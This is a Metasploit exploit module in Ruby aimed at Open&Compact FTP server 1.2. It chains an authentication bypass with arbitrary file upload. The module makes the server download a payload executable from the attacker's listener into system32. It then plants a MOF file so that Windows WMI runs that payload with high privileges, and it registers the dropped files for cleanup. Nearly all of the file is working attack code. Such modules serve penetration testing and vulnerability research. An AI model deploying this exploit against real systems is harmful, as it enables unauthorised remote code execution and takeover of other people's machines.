##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Ftp
        include Msf::Exploit::Remote::TcpServer
        include Msf::Exploit::EXE
        include Msf::Exploit::WbemExec
        include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Open-FTPD 1.2 Arbitrary File Upload",
      'Description'    => %q{
        This module exploits multiple vulnerabilities found in Open&Compact FTP
        server. The software contains an authentication bypass vulnerability and a
        arbitrary file upload vulnerability that allows a remote attacker to write
        arbitrary files to the file system as long as there is at least one user
        who has permission.

        Code execution can be achieved by first uploading the payload to the remote
        machine as an exe file, and then upload another mof file, which enables
        WMI (Management Instrumentation service) to execute the uploaded payload.
        Please note that this module currently only works for Windows before Vista.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Serge Gorbunov', # Initial discovery
          'Brendan Coles <bcoles[at]gmail.com>', # Metasploit
        ],
      'References'     =>
        [
          ['OSVDB', '65687'],
          ['EDB',   '13932'],
          ['CVE',   '2010-2620']
        ],
      'Payload'        =>
        {
          'BadChars' => "\x00",
        },
      'Platform'       => 'win',
      'Stance'         => Msf::Exploit::Stance::Aggressive,
      'Targets'        =>
        [
          # Tested on version 1.2 - Windows XP SP3 (EN)
          ['Open&Compact FTP 1.2 on Windows (Before Vista)', {}]
        ],
      'Privileged'     => true,
      'DisclosureDate' => "Jun 18 2012",
      'DefaultTarget'  => 0))

    register_options([
      OptString.new('PATH',  [true, 'The local Windows path', "C:/WINDOWS/"]),
      OptPort.new('SRVPORT', [true, 'The local port to listen on for active mode', 8080])
    ], self.class)
    deregister_options('FTPUSER', 'FTPPASS') # Using authentication bypass

  end

  def check
    connect
    disconnect

    if banner =~ /\*\*        Welcome on       \*\*/
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Unknown
    end
  end

  def on_client_connect(cli)
    peer = "#{cli.peerhost}:#{cli.peerport}"

    case @stage
    when :exe
      print_status("#{peer} - Sending executable (#{@exe.length.to_s} bytes)")
      cli.put(@exe)
      @stage = :mof
    when :mof
      print_status("#{peer} - Sending MOF (#{@mof.length.to_s} bytes)")
      cli.put(@mof)
    end

    cli.close
  end

  # Largely stolen from freefloatftp_wbem.rb
  def upload(filename)
    select(nil, nil, nil, 1)

    peer = "#{rhost}:#{rport}"
    print_status("#{peer} - Trying to upload #{::File.basename(filename)}")
    conn = connect(false, datastore['VERBOSE'])
    if not conn
      fail_with(Exploit::Failure::Unreachable, "#{@peer} - Connection failed")
    end

    # Switch to binary mode
    print_status("#{peer} - Set binary mode")
    send_cmd(['TYPE', 'I'], true, conn)

    # Prepare active mode: Get attacker's IP and source port
    src_ip   = datastore['SRVHOST'] == '0.0.0.0' ? Rex::Socket.source_address : datastore['SRVHOST']
    src_port = datastore['SRVPORT'].to_i

    # Prepare active mode: Convert the IP and port for active mode
    src_ip   = src_ip.gsub(/\./, ',')
    src_port = "#{src_port/256},#{src_port.remainder(256)}"

    # Set to active mode
    print_status("#{peer} - Set active mode \"#{src_ip},#{src_port}\"")
    send_cmd(['PORT', "#{src_ip},#{src_port}"], true, conn)

    # Tell the FTP server to download our file
    send_cmd(['STOR', filename], false, conn)

    print_good("#{peer} - Upload successful")
    disconnect(conn)
  end

  # Largely stolen from freefloatftp_wbem.rb
  def exploit
    path     = datastore['PATH']
    exe_name = "#{path}/system32/#{rand_text_alpha(rand(10)+5)}.exe"
    mof_name = "#{path}/system32/wbem/mof/#{rand_text_alpha(rand(10)+5)}.mof"
    @mof      = generate_mof(::File.basename(mof_name), ::File.basename(exe_name))
    @exe      = generate_payload_exe
    @stage = :exe

    begin
      t = framework.threads.spawn("reqs", false) {
        # Upload our malicious executable
        u = upload(exe_name)
        # Upload the mof file
        upload(mof_name) if u
        register_file_for_cleanup("#{::File.basename(exe_name)}")
        register_file_for_cleanup("wbem\\mof\\good\\#{::File.basename(mof_name)}")
      }

      super
    ensure
      t.kill
    end
  end

end
